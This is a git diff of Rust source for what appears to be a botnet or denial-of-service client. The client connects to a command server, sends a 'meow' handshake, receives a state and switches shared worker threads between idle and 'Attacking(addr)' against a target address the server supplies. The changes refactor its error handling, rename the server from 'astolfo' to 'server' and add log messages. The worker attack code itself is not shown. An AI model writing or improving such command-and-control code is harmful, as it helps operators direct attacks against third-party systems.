@@ -11,6 +11,8 @@ fn main() {
         process::exit(1);
     });
 
+    println!("[\x1b[92mSUCC\x1b[0m] Connection established to server");
+
     let mut prev_state = FemState::Idle;
     let working_state = Arc::new(RwLock::new(FemState::Idle));
 
@@ -37,21 +39,21 @@ fn main() {
         let hello_msg = b"meow";
         let hello_size : [u8; 2] = (hello_msg.len() as u16).to_be_bytes();
 
-        stream.write_all(&hello_size).unwrap_or_else(|_| {
-            eprintln!("[\x1b[911mERR\x1b[0m] Lost connection to astolfo");
+        if let Err(_) = stream.write_all(&hello_size) {
+            eprintln!("[\x1b[911mERR\x1b[0m] Lost connection to server");
             process::exit(1);
-        });
+        }
 
-        stream.write_all(hello_msg).unwrap_or_else(|_| {
-            eprintln!("[\x1b[911mERR\x1b[0m] Lost connection to astolfo");
+        if let Err(_) = stream.write_all(hello_msg) {
+            eprintln!("[\x1b[911mERR\x1b[0m] Lost connection to server");
             process::exit(1);
-        });
+        }
 
         let mut size_buf = [0u8; 2];
-        stream.read_exact(&mut size_buf).unwrap_or_else(|_| {
-            eprintln!("[\x1b[911mERR\x1b[0m] Lost connection to astolfo");
+        if let Err(_) = stream.read_exact(&mut size_buf) {
+            eprintln!("[\x1b[911mERR\x1b[0m] Lost connection to server");
             process::exit(1);
-        });
+        }
 
         let size = u16::from_be_bytes(size_buf);
         let mut state = vec![0u8; size as usize];
@@ -68,13 +70,13 @@ fn main() {
                 if cmd != prev_state {
                     match cmd {
                         FemState::Idle => {
-                            let mut write_guard = working_state.write().unwrap();
+                            let mut write_guard = working_state.write().expect("[\x1b[90mFATAL\x1b[0m] Lock stuck");
                             *write_guard = FemState::Idle;
                             prev_state = FemState::Idle;
                             println!("[\x1b[94mINFO\x1b[0m] Set workers to idle");
                         },
                         FemState::Attacking(addr) => {
-                            let mut write_guard = working_state.write().unwrap();
+                            let mut write_guard = working_state.write().expect("[\x1b[90mFATAL\x1b[0m] Lock stuck");
                             *write_guard = FemState::Attacking(addr.clone());
                             prev_state = FemState::Attacking(addr);
                             println!("[\x1b[94mINFO\x1b[0m] Set workers to attack");
